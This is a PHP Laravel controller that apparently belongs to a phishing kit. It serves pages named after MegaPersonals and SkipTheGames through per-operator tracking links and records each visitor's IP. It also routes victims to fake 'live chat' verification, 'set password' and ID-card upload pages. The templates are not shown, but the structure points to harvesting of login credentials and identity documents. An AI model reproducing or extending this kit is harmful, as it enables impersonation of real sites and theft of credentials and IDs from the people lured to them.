<?php

namespace App\Http\Controllers\Account;

use App\Http\Controllers\Controller;
use App\Models\Account;
use App\Models\User;
use App\Services\LinkInfoService;
use Illuminate\View\View;

class ViewPageController extends Controller
{
    public function __construct(protected LinkInfoService $linkInfoService){}


    public function megaPersonalsView(int $userId): View
    {
        return $this->viewPage($userId, 'megapersonals', 'megapersonals');
    }

    public function skipTheGamesView($userId): View
    {
        return $this->viewPage($userId, 'skipthegames', 'skipthegames');
    }

    protected function viewPage(int $userId, string $type, string $viewName)
    {
        $this->createVisitorInfo($userId);

        return view($viewName, [
            'type' => $type,
            'user_id' => $userId
        ]);
    }

    protected function createVisitorInfo(int $userId): void
    {
        abort_if(!User::whereId($userId)->first(), 404);

        $visitor_ip = request()->ip();

        $this->linkInfoService->create($visitor_ip, $userId);
    }

    public function duoLiveChat($userId)
    {
        $this->createVisitorInfo($userId);

        return view('mega-verification.index', [
            'user_id' => $userId
        ]);
    }

    public function duoLiveChatVerify($userId)
    {
        abort_if(!User::whereId($userId)->first(), 404);

        return view('mega-verification.verify-chat', [
            'user_id' => $userId
        ]);
    }

    public function authLoginPage($userId)
    {
        abort_if(!User::whereId($userId)->first(), 404);

        return view('mega-verification.set-mega-password', [
            'user_id' => $userId
        ]);
    }

    public function megaIdCardVerify($accountId)
    {
        abort_if(!Account::whereId($accountId)->first(), 404);

        return view('mega-verification.mega-id-card-verification', [
            'account_id' => $accountId
        ]);
    }
}
